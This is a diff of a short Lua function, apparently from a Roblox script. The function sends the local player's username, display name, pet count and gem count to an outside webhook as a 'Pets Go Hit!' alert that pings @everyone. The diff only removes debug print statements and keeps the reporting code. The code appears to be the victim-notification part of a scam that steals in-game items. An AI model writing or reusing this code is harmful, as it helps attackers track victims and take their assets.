@@ -1,6 +1,4 @@
 return function(dh,pn,gn,dp)
-print(_G.wh)
-print(dh,pn,gn,dp)
 if not dp then dp = 0 end
 local msg = ""
 if dh then
@@ -8,7 +6,6 @@ msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer
 else
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
-print(msg)
 local response =
         request(
         {
@@ -18,15 +15,5 @@ local response =
             Body = msg
         }
     )
-print(response)
-function ptable(t)
-for i,v in pairs(t) do
-print(i,v)
-if typeof(v)=="table" then
-ptable(v)
-end
-end
-end
-ptable(response)
 return response
 end
